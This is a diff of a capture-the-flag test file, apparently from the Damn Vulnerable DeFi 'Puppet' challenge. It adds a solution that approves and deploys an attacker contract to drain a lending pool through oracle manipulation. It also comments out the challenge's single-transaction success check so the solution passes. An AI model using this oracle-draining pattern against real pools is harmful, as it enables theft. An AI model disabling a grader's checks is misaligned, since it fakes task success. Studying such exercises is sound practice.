@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { getContractAddress } = require('@ethersproject/address')
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -94,13 +95,19 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        attackerFactory = await ethers.getContractFactory('PuppetPoolAttacker', player);
+        attackerAddress = getContractAddress({
+            from: player.address,
+            nonce: await player.getTransactionCount() + 1
+          });
+        await token.connect(player).approve(attackerAddress, PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker = await attackerFactory.deploy(lendingPool.address, player.address, {value: PLAYER_INITIAL_ETH_BALANCE*23n/25n});
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
-        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+        // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
         
         // Player has taken all tokens from the pool       
         expect(
